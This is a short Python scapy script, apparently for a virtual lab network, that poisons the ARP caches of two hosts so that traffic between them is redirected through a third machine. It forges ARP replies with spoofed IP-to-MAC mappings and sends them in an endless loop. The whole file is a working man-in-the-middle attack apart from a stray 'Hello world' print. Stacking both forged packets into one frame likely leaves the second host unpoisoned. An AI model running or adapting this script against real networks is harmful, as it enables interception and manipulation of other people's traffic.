from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp

print("Hello world")

macM3 = "08:00:27:af:ee:33"
ipM3 = "192.168.56.103"

macM1 = "08:00:27:d5:68:72"
ipM1 = "192.168.56.101"

macM2 = "08:00:27:d0:ed:b3"
ipM2 = "192.168.56.102"

arpM1 = Ether() / ARP()
arpM1[Ether].src = macM3
arpM1[ARP].hwsrc = macM3
arpM1[ARP].psrc = ipM2
arpM1[ARP].hwdst = macM1
arpM1[ARP].pdst = ipM1

arpM2 = Ether() / ARP()
arpM2[Ether].src = macM3
arpM2[ARP].hwsrc = macM3
arpM2[ARP].psrc = ipM1
arpM2[ARP].hwdst = macM2
arpM2[ARP].pdst = ipM2

sendp(arpM1 / arpM2, iface="enp0s3", loop=1, inter=1)
